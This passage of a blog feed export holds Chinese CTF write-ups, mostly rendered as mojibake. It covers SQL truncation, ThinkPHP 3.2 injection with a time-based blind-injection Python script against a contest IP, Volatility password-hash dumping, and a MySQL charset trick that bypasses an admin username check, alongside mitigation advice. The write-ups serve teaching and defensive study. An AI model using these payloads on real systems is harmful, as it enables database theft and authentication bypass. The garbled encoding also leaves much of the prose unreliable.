alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">è¿›è¡Œæ³¨å†Œåï¼Œç„¶åè¿›è¡Œç™»å½•å´æç¤ºï¼š<br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl6t155omj30h404jgli.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬æ³¨å†Œadminçš„è´¦æˆ·<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6v0u7l9j30gk04xweg.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å´æç¤ºç”¨æˆ·å·²å­˜åœ¨ï¼Œé‚£ä¹ˆç°åœ¨å¯ä»¥æƒ³åˆ°æ³¨å†Œéƒ¨åˆ†æœ‰ä¸¤ä¸ªæ•°æ®åº“æŸ¥è¯¢æ“ä½œ:å…ˆselectæ£€æµ‹ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨å°±è¿›è¡Œæ•°æ®åº“æ’å…¥æ“ä½œï¼Œè‹¥å­˜åœ¨å°±æ³¨å†Œå¤±è´¥ã€‚ç™»å½•ç•Œé¢å¯èƒ½æ˜¯selectæŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡®ã€‚è¿™æ ·ä¸€èˆ¬æ”»å‡»è€…å°±ä¼šè¿›è¡Œæ³¨å…¥æµ‹è¯•ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸æ˜¯æƒ³è®©æ”»å‡»è€…åœ¨è¿™æ³¨å…¥ç„¶åæ‹¿åˆ°adminçš„å¯†ç ï¼Œæ¥çœ‹æ³¨å†Œéƒ¨åˆ†çš„ä»£ç selectæ–¹æ³•ä½¿ç”¨é¢„å¤„ç†æœºåˆ¶+tpè‡ªå¸¦çš„è½¬ä¹‰ï¼Œinsertéƒ¨åˆ†addslashesè½¬ä¹‰åå…¥åº“ï¼Œé‚£ä¹ˆæ³¨å†Œéƒ¨åˆ†åŸºæœ¬å°±ä¸å¯èƒ½æ³¨å…¥äº†ã€‚</p><p>åœ¨åˆ›å»ºå­—æ®µçš„æ—¶å€™ å¦‚æœæŒ‡å®šäº† å­—æ®µçš„é•¿åº¦ å¯ä»¥ç”¨sqlçº¦æŸæ”»å‡»è¿›è¡Œç»•è¿‡<br>å­¦ä¹ ç†è§£sqlçº¦æŸæ”»å‡»å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« <br><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a></p><p>æ¥ä¸‹æ¥æ³¨å†Œè´¦æˆ·admin              â€˜ (ä¸­é—´æœ‰nä¸ªç©ºæ ¼)ï¼Œå¯†ç 11111111</p><p>æ³¨å†Œç™»å…¥æˆåŠŸ å‘ç°æ˜¯ä¸€ä¸ªæœç´¢æ¡†<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6vtehy6j30hb076wef.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°æ˜¯ThinkPHP3.2 æ¡†æ¶<br>ç™¾åº¦è°·æ­Œæœç´¢ å‘ç°æœ‰æ­¤æ¡†æ¶çš„sqlæ³¨å…¥æ¼æ´<br>åˆ©ç”¨å‚æ•°ä¼ å…¥æ•°ç»„ç±»å‹æ•°æ®å¯¼è‡´ç»•è¿‡è¿‡æ»¤å¯¼è‡´sqlæ³¨å…¥</p><p>å…·ä½“å‚è€ƒ:<br><a href="https://xz.aliyun.com/t/2629#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629#toc-2</a></p><p>?search[table]=flag where 1 and polygon(id)â€“<br>åˆ†åˆ«å¾—åˆ°æ•°æ®åº“å è¡¨æ˜ å­—æ®µå</p><p><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl6wx8637j30he0323yo.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å­—æ®µåæ˜¯flag</p><pre><code>http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(3),0)--</code></pre><p>è¿›è¡Œç›²æ³¨æµ‹è¯• æˆåŠŸå»¶è¿Ÿ<br>expå¦‚ä¸‹:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="built_in">flag</span> = <span class="string">''</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'re4g49sil8hfh4ovfrk7ln1o02'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="built_in">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+<span class="built_in">str</span>(i)+<span class="string">',1))='</span>+<span class="built_in">str</span>(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>,cookies=cookies)</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">flag</span> += j</span><br><span class="line">            print <span class="built_in">flag</span></span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h2><p><strong>è€ƒç‚¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å†…å­˜é•œåƒåˆ†æ</span><br><span class="line">Volatility çš„ä½¿ç”¨</span><br></pre></td></tr></table></figure><p>Volatilityæ˜¯ä¸€æ¬¾å¼€æºçš„ï¼ŒåŸºäºPythonå¼€å‘çš„å†…å­˜å–è¯å·¥å…·é›†ï¼Œå¯ä»¥åˆ†æå†…å­˜ä¸­çš„å„ç§æ•°æ®ã€‚Volatilityæ”¯æŒå¯¹32ä½æˆ–64ä½Wnidowsã€Linuxã€Macã€Androidæ“ä½œç³»ç»Ÿçš„RAMæ•°æ®è¿›è¡Œæå–ä¸åˆ†æã€‚</p><p>volatility ä½¿ç”¨ï¼š<br>volatility -f &lt;æ–‡ä»¶å&gt; â€“profile=&lt;é…ç½®æ–‡ä»¶&gt; &lt;æ’ä»¶&gt; [æ’ä»¶å‚æ•°]</p><p>å…ˆä½¿ç”¨imageinfoæ’ä»¶æ¥çŒœæµ‹dumpæ–‡ä»¶çš„profileå€¼<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6y3f6oqj30hg04saaw.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¾—åˆ°ç±»å‹ä¸ºWinXPSP2x86</p><p>åˆ—ä¸¾ç¼“å­˜åœ¨å†…å­˜çš„æ³¨å†Œè¡¨,æ‰¾åˆ°systemå’Œsam keyçš„èµ·å§‹ä½ç½® ï¼š</p><pre><code>hivelist -f memory -profile=WinXPSP2x86</code></pre><p><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl70b5q9tj30he04gmyf.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é€‰æ‹©ç³»ç»Ÿç‰ˆæœ¬, æå–é•œåƒç”¨æˆ·ä¿¡æ¯</p><pre><code>volatility -f memory --profile=WinXPSP2x86 hashdump</code></pre><p>è·å¾—Administratorçš„NThash:c22b315c040ae6e0efee3518d830362b</p><p>å¾—åˆ°å¯†ç 123456789<br>MD5åæäº¤</p><h2 id="èµ¢æˆ˜2019"><a href="#èµ¢æˆ˜2019" class="headerlink" title="èµ¢æˆ˜2019"></a>èµ¢æˆ˜2019</h2><p><strong>è€ƒç‚¹</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">foremost</span> çš„ä½¿ç”¨</span><br><span class="line"><span class="keyword">binwalk </span> çš„ä½¿ç”¨</span><br><span class="line"><span class="symbol">stegsolve</span> çš„ä½¿ç”¨</span><br></pre></td></tr></table></figure><p>ç”¨foremostæˆ–è€…binwalkåˆ†ç¦»å¾—åˆ°ä¸€å¼ äºŒç»´ç <br>å†ç”¨stegsolveè¿›è¡Œåˆ†æå¾—åˆ°flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h2 id="é”®ç›˜ä¹‹äº‰"><a href="#é”®ç›˜ä¹‹äº‰" class="headerlink" title="é”®ç›˜ä¹‹äº‰"></a>é”®ç›˜ä¹‹äº‰</h2><p><strong>è€ƒç‚¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QWERTYé”®ç›˜ä¸Dvoraké”®ç›˜</span><br></pre></td></tr></table></figure><p>ç™¾åº¦äº†ä¸€ä¸‹ äº†è§£ä¸€ä¸‹<br>å°±æ˜¯è¯¥ç”¨QWERTYé”®ç›˜è¿˜æ˜¯Dvoraké”®ç›˜<br>å…·ä½“å¯çœ‹<br><a href="http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html</a><br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl72dg5ztj30hi0a2juu.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>QWERTYé”®ç›˜<br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl738hwmfj30ih069gnw.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”±ypau_kjg;â€g;â€ypau+  æ ¹æ®æ˜ å°„å…³ç³» å¯å¾—åˆ°flag<br>åœ¨çº¿è§£å¯†ç½‘å€<br><a href="http://wbic16.xedoloh.com/dvorak.html" target="_blank" rel="noopener">http://wbic16.xedoloh.com/dvorak.html</a><br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl73yh2y7j30i509rmzh.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.anquanke.com/post/id/170341" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170341</a><br><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a><br><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629</a><br><a href="https://www.freebuf.com/column/152545.html" target="_blank" rel="noopener">https://www.freebuf.com/column/152545.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mysqlå­—ç¬¦ç¼–ç åˆ©ç”¨æŠ€å·§</title>
      <link href="/2019/01/12/Mysql%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/01/12/Mysql%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>é€ æˆè¿™ç§æ¼æ´çš„åŸå› æ˜¯<br>Mysqlå­—æ®µçš„å­—ç¬¦é›†å’Œphp mysqliå®¢æˆ·ç«¯è®¾ç½®çš„å­—ç¬¦é›†ä¸ç›¸åŒã€‚</p><h2 id="MySQLå­—ç¬¦é›†ä»‹ç»"><a href="#MySQLå­—ç¬¦é›†ä»‹ç»" class="headerlink" title="MySQLå­—ç¬¦é›†ä»‹ç»"></a>MySQLå­—ç¬¦é›†ä»‹ç»</h2><p>MySQLæœåŠ¡å™¨å¯ä»¥æ”¯æŒå¤šç§å­—ç¬¦é›†ï¼Œåœ¨åŒä¸€å°æœåŠ¡å™¨ï¼ŒåŒä¸€ä¸ªæ•°æ®åº“ï¼Œç”šè‡³åŒä¸€ä¸ªè¡¨çš„ä¸åŒå­—æ®µéƒ½å¯ä»¥æŒ‡å®šä½¿ç”¨ä¸åŒçš„å­—ç¬¦é›†ï¼Œç›¸æ¯”oracleç­‰å…¶ä»–æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œåœ¨åŒä¸€ä¸ªæ•°æ®åº“åªèƒ½ä½¿ç”¨ç›¸åŒçš„å­—ç¬¦é›†ï¼ŒMySQLæ˜æ˜¾å­˜åœ¨æ›´å¤§çš„çµæ´»æ€§ã€‚<br>MySQLæä¾›äº†ä¸åŒçº§åˆ«çš„è®¾ç½®ï¼ŒåŒ…æ‹¬serverçº§ã€databaseçº§ã€tableçº§ã€columnçº§ï¼Œå¯ä»¥æä¾›éå¸¸ç²¾å‡†çš„è®¾ç½®ã€‚<br>æˆ‘ä»¬åœ¨è¿›è¡Œç¼–å†™phpæ–‡ä»¶çš„æ—¶å€™</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$mysqli</span> = new mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"cat"</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">/* check connection */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">    printf(<span class="string">"Connect failed: %s\n"</span>, <span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;query(<span class="string">"set names utf8"</span>);</span><br></pre></td></tr></table></figure><p>è®¾ç½®äº†å­—ç¬¦é›†ä¸ºUTF-8<br>set names utf8 çš„æ„æ€æ˜¯å°†å®¢æˆ·ç«¯çš„å­—ç¬¦é›†è®¾ç½®ä¸ºutf8<br>åœ¨mysqlå¯ä»¥æŸ¥çœ‹<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-12/64138853.jpg" alt=""><br>å¦‚ä¸Šå›¾ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œmysqlå­—ç¬¦é›†ä¸ºlatin1ï¼Œè€Œæ‰§è¡Œäº†set names utf8;ä»¥åï¼Œcharacter_set_clientã€character_set_connectionã€character_set_resultsç­‰ä¸å®¢æˆ·ç«¯ç›¸å…³çš„é…ç½®å­—ç¬¦é›†éƒ½å˜æˆäº†utf8ï¼Œä½†character_set_databaseã€character_set_serverç­‰æœåŠ¡ç«¯ç›¸å…³çš„å­—ç¬¦é›†è¿˜æ˜¯latin1ã€‚</p><p>è¿™å°±æ˜¯è¯¥Trickçš„æ ¸å¿ƒï¼Œå› ä¸ºè¿™ä¸€æ¡è¯­å¥ï¼Œå¯¼è‡´å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯çš„å­—ç¬¦é›†å‡ºç°äº†å·®åˆ«ã€‚æ—¢ç„¶æœ‰å·®åˆ«ï¼ŒMysqlåœ¨æ‰§è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œå°±æ¶‰åŠåˆ°å­—ç¬¦é›†çš„è½¬æ¢ã€‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL Serveræ”¶åˆ°è¯·æ±‚æ—¶å°†è¯·æ±‚æ•°æ®ä»character_<span class="keyword">set</span>_client</span><br><span class="line">è½¬æ¢ä¸ºcharacter_<span class="keyword">set</span>_connectionï¼›</span><br><span class="line">è¿›è¡Œå†…éƒ¨æ“ä½œå‰å°†è¯·æ±‚æ•°æ®ä»character_<span class="keyword">set</span>_connectionè½¬æ¢ä¸ºå†…éƒ¨æ“ä½œå­—ç¬¦é›†</span><br></pre></td></tr></table></figure><h1 id="å®æˆ˜ä¸€"><a href="#å®æˆ˜ä¸€" class="headerlink" title="å®æˆ˜ä¸€"></a>å®æˆ˜ä¸€</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($username === <span class="string">'admin'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Permission denied!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$result = $mysqli-&gt;query(<span class="string">"SELECT * FROM z_users where username = '&#123;$username&#125;' and password = '&#123;$password&#125;'"</span>);</span></span><br></pre></td></tr></table></figure><p>ifè¯­å¥å«Œç–‘å¾ˆå¤§ï¼Œå¤§æ¦‚æ˜¯è€ƒæˆ‘ä»¬æ€ä¹ˆç™»é™†adminçš„è´¦å·</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>åœ¨æˆ‘ä»¬è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œcharacter_set_clientå’Œcharacter_set_connectionè¢«è®¾ç½®æˆäº†utf8ï¼Œè€Œå†…éƒ¨æ“ä½œå­—ç¬¦é›†å…¶å®ä¹Ÿå°±æ˜¯usernameå­—æ®µçš„å­—ç¬¦é›†è¿˜æ˜¯é»˜è®¤çš„latin1ã€‚äºæ˜¯ï¼Œæ•´ä¸ªæ“ä½œå°±æœ‰å¦‚ä¸‹å­—ç¬¦ä¸²è½¬æ¢è¿‡ç¨‹ï¼š</p><p>utf8 â€“&gt; utf8 â€“&gt; latin1</p><p>æœ€åæ‰§è¡Œæ¯”è¾ƒusername=â€™adminâ€™çš„æ—¶å€™ï¼Œâ€™adminâ€™æ˜¯ä¸€ä¸ªlatin1å­—ç¬¦ä¸²ã€‚<br>Mysqlåœ¨è½¬æ¢å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå°†ä¸å®Œæ•´çš„å­—ç¬¦ç»™å¿½ç•¥äº†ã€‚<br>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œä½¬è¿™ä¸ªæ±‰å­—çš„UTF-8ç¼–ç æ˜¯\xE4\xBD\xACï¼Œæˆ‘ä»¬å¯ä»¥ä¾æ¬¡å°è¯•è®¿é—®ä¸‹é¢ä¸‰ä¸ªURLï¼š</p><pre><code>http://localhost:9090/test.php?username=admin%e4http://localhost:9090/test.php?username=admin%e4%bdhttp://localhost:9090/test.php?username=admin%e4%bd%ac</code></pre><p>å¯ä»¥å‘ç°ï¼Œå‰ä¸¤è€…éƒ½èƒ½æˆåŠŸè·å–åˆ°username=adminçš„ç»“æœï¼Œè€Œæœ€åä¸€ä¸ªURLï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘è¾“å…¥ä½¬å­—å®Œæ•´çš„ç¼–ç æ—¶ï¼Œå°†ä¼šå¤±è´¥ï¼š</p><p><strong>ä¸ºä»€ä¹ˆä¼šæŠ›å‡ºé”™è¯¯ï¼Ÿ</strong><br>åŸå› å¾ˆç®€å•ï¼Œå› ä¸ºlatin1å¹¶ä¸æ”¯æŒæ±‰å­—ï¼Œæ‰€ä»¥utf8æ±‰å­—è½¬æ¢æˆlatin1æ—¶å°±æŠ›å‡ºäº†é”™è¯¯ã€‚</p><p>é‚£å‰ä¸¤æ¬¡ä¸ºä»€ä¹ˆæ²¡æœ‰æŠ›å‡ºé”™è¯¯ï¼Ÿå› ä¸ºå‰ä¸¤æ¬¡è¾“å…¥çš„ç¼–ç å¹¶ä¸å®Œæ•´ï¼ŒMysqlåœ¨è¿›è¡Œç¼–ç è½¬æ¢æ—¶ï¼Œå°±å°†å…¶å¿½ç•¥äº†ã€‚</p><p>è¿™ä¸ªç‰¹ç‚¹ä¹Ÿå¯¼è‡´ï¼Œæˆ‘ä»¬æŸ¥è¯¢username=admin%e4æ—¶ï¼Œ%e4è¢«çœç•¥ï¼Œæœ€åæŸ¥å‡ºäº†username=adminçš„ç»“æœã€‚</p><h2 id="åªæœ‰éƒ¨åˆ†å­—ç¬¦å¯ä»¥ä½¿ç”¨"><a href="#åªæœ‰éƒ¨åˆ†å­—ç¬¦å¯ä»¥ä½¿ç”¨" class="headerlink" title="åªæœ‰éƒ¨åˆ†å­—ç¬¦å¯ä»¥ä½¿ç”¨"></a>åªæœ‰éƒ¨åˆ†å­—ç¬¦å¯ä»¥ä½¿ç”¨</h2><p>æˆ‘åœ¨æµ‹è¯•è¿™ä¸ªTrickçš„æ—¶å€™å‘ç°ï¼Œusername=admin%c2æ—¶å¯ä»¥æ­£ç¡®å¾—åˆ°ç»“æœï¼Œä½†username=admin%c1å°±ä¸è¡Œï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ<br>ç®€å•fuzzäº†ä¸€ä¸‹ï¼Œå¦‚æœåœ¨adminåé¢åŠ ä¸Šä¸€ä¸ªå­—ç¬¦ï¼Œæœ‰å¦‚ä¸‹ç»“æœï¼š</p><pre><code>\x00~\x7Fï¼š è¿”å›ç©ºç™½ç»“æœ\x80~\xC1ï¼š è¿”å›é”™è¯¯Illegal mix of collations\xC2~\xEFï¼š è¿”å›adminçš„ç»“æœ\xF0~\xFFï¼š è¿”å›é”™è¯¯Illegal mix of collations</code></pre><h2 id="å®æˆ˜äºŒ"><a href="#å®æˆ˜äºŒ" class="headerlink" title="å®æˆ˜äºŒ"></a>å®æˆ˜äºŒ</h2><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-12/67794247.jpg" alt=""><br>åŒç†æ˜¯è¿™ä¸ªifè¯­å¥</p><pre><code>æ¯”è¾ƒ$row[&apos;id&apos;]å’Œ$idçš„åŒºåˆ«</code></pre><p>ä»¤id=%c2 å³å¯</p><h2 id="å®æˆ˜ä¸‰"><a href="#å®æˆ˜ä¸‰" class="headerlink" title="å®æˆ˜ä¸‰"></a>å®æˆ˜ä¸‰</h2><h1 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h1><p>ä½¿ç”¨MySQLå­—ç¬¦é›†æ—¶çš„å»ºè®®</p><p>å»ºç«‹æ•°æ®åº“/è¡¨å’Œè¿›è¡Œæ•°æ®åº“æ“ä½œæ—¶å°½é‡æ˜¾å¼æŒ‡å‡ºä½¿ç”¨çš„å­—ç¬¦é›†ï¼Œè€Œä¸æ˜¯ä¾èµ–äºMySQLçš„é»˜è®¤è®¾ç½®ï¼Œå¦åˆ™MySQLå‡çº§æ—¶å¯èƒ½å¸¦æ¥å¾ˆå¤§å›°æ‰°ï¼›</p><p>â€¢ æ•°æ®åº“å’Œè¿æ¥å­—ç¬¦é›†éƒ½ä½¿ç”¨latin1æ—¶è™½ç„¶å¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½å¯ä»¥è§£å†³ä¹±ç é—®é¢˜ï¼Œä½†ç¼ºç‚¹æ˜¯æ— æ³•ä»¥å­—ç¬¦ä¸ºå•ä½æ¥è¿›è¡ŒSQLæ“ä½œï¼Œä¸€èˆ¬æƒ…å†µä¸‹å°†æ•°æ®åº“å’Œè¿æ¥å­—ç¬¦é›†éƒ½ç½®ä¸ºutf8æ˜¯è¾ƒå¥½çš„é€‰æ‹©ï¼›</p><p>â€¢ ä½¿ç”¨mysql C APIæ—¶ï¼Œåˆå§‹åŒ–æ•°æ®åº“å¥æŸ„åé©¬ä¸Šç”¨mysql_optionsè®¾å®šMYSQL_SET_CHARSET_NAMEå±æ€§ä¸ºutf8ï¼Œè¿™æ ·å°±ä¸ç”¨æ˜¾å¼åœ°ç”¨ SET NAMESè¯­å¥æŒ‡å®šè¿æ¥å­—ç¬¦é›†ï¼Œä¸”ç”¨mysql_pingé‡è¿æ–­å¼€çš„é•¿è¿æ¥æ—¶ä¹Ÿä¼šæŠŠè¿æ¥å­—ç¬¦é›†é‡ç½®ä¸ºutf8ï¼›</p><p>â€¢ å¯¹äºmysql PHP APIï¼Œä¸€èˆ¬é¡µé¢çº§çš„PHPç¨‹åºæ€»è¿è¡Œæ—¶é—´è¾ƒçŸ­ï¼Œåœ¨è¿æ¥åˆ°æ•°æ®åº“ä»¥åæ˜¾å¼ç”¨SET NAMESè¯­å¥è®¾ç½®ä¸€æ¬¡è¿æ¥å­—ç¬¦é›†å³å¯ï¼›ä½†å½“ä½¿ç”¨é•¿è¿æ¥æ—¶ï¼Œè¯·æ³¨æ„ä¿æŒè¿æ¥é€šç•…å¹¶åœ¨æ–­å¼€é‡è¿åç”¨SET NAMESè¯­å¥æ˜¾å¼é‡ç½®è¿æ¥å­—ç¬¦é›†ã€‚</p><p>å…¶ä»–æ³¨æ„äº‹é¡¹<br>â€¢ my.cnfä¸­çš„default_character_setè®¾ç½®åªå½±å“mysqlå‘½ä»¤è¿æ¥æœåŠ¡å™¨æ—¶çš„è¿æ¥å­—ç¬¦é›†ï¼Œä¸ä¼šå¯¹ä½¿ç”¨libmysqlclientåº“çš„åº”ç”¨ç¨‹åºäº§ç”Ÿä»»ä½•ä½œç”¨ï¼</p><p>â€¢ å¯¹å­—æ®µè¿›è¡Œçš„SQLå‡½æ•°æ“ä½œé€šå¸¸éƒ½æ˜¯ä»¥å†…éƒ¨æ“ä½œå­—ç¬¦é›†è¿›è¡Œçš„ï¼Œä¸å—è¿æ¥å­—ç¬¦é›†è®¾ç½®çš„å½±å“ã€‚</p><p>â€¢ SQLè¯­å¥ä¸­çš„è£¸å­—ç¬¦ä¸²ä¼šå—åˆ°è¿æ¥å­—ç¬¦é›†æˆ–introducerè®¾ç½®çš„å½±å“ï¼Œå¯¹äºæ¯”è¾ƒä¹‹ç±»çš„æ“ä½œå¯èƒ½äº§ç”Ÿå®Œå…¨ä¸åŒçš„ç»“æœï¼Œéœ€è¦å°å¿ƒï¼</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">Mysqlå­—ç¬¦ç¼–ç åˆ©ç”¨æŠ€å·§</a><br><a href="http://www.laruence.com/2008/01/05/3192.html" target="_blank" rel="noopener">æ·±å…¥Mysqlå­—ç¬¦é›†è®¾ç½®</a><br><a href="https://www.leavesongs.com/PENETRATION/Mini-XCTF-Writeup.html" target="_blank" rel="noopener">XCTFä¸¤é“webé¢˜ç›®çš„writeup</a></p><p><a href="https://www.jb51.net/article/132521.htm" target="_blank" rel="noopener">å¸¦ä½ 5åˆ†é’Ÿè¯»æ‡‚MySQLå­—ç¬¦é›†è®¾ç½®</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018Â·iæ˜¥ç§‹åœ£è¯æ¬¢ä¹èµ›å®˜æ–¹WriteUp</title>
      <link href="/2019/01/12/2018%C2%B7i%E6%98%A5%E7%A7%8B%E5%9C%A3%E8%AF%9E%E6%AC%A2%E4%B9%90%E8%B5%9B%E5%AE%98%E6%96%B9WriteUp/"/>
      <url>/2019/01/12/2018%C2%B7i%E6%98%A5%E7%A7%8B%E5%9C%A3%E8%AF%9E%E6%AC%A2%E4%B9%90%E8%B5%9B%E5%AE%98%E6%96%B9WriteUp/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>æ‰“å¼€é¡µé¢<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/41923075.jpg" alt=""></p><p>è€ƒç‚¹: snow htmléšå†™</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snow</span> æ˜¯ä¸€æ¬¾åœ¨htmlåµŒå…¥éšå†™ä¿¡æ¯çš„è½¯ä»¶ï¼Œ</span><br><span 